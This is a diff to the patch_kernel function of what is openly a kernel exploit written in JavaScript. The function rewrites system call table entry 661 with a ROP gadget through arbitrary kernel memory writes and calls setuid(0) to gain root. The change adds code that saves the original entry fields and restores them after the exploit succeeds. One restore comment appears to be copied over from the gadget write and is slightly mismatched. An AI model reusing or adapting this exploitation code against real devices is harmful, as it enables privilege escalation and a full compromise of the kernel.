@@ -1505,6 +1505,9 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
     // sysent[661] is unimplemented so free for use
     const offset_sysent_661 = 0x1107f00;
     const sysent_661 = kbase.add(offset_sysent_661);
+    const sy_narg = kmem.read32(sysent_661);
+    const sy_call = kmem.read64(sysent_661.add(8));
+    const sy_thrcnt = kmem.read32(sysent_661.add(0x2c));
     // .sy_narg = 6
     kmem.write32(sysent_661, 6);
     // .sy_call = gadgets['jmp qword ptr [rsi]']
@@ -1594,6 +1597,12 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
     log('setuid(0)');
     sysi('setuid', 0);
     log('kernel exploit succeeded!');
+    log('restore sys_aio_submit()');
+    kmem.write32(sysent_661, sy_narg);
+    // .sy_call = gadgets['jmp qword ptr [rsi]']
+    kmem.write64(sysent_661.add(8), sy_call);
+    // .sy_thrcnt = SY_THR_STATIC
+    kmem.write32(sysent_661.add(0x2c), sy_thrcnt);
     alert("kernel exploit succeeded!");
 }
 
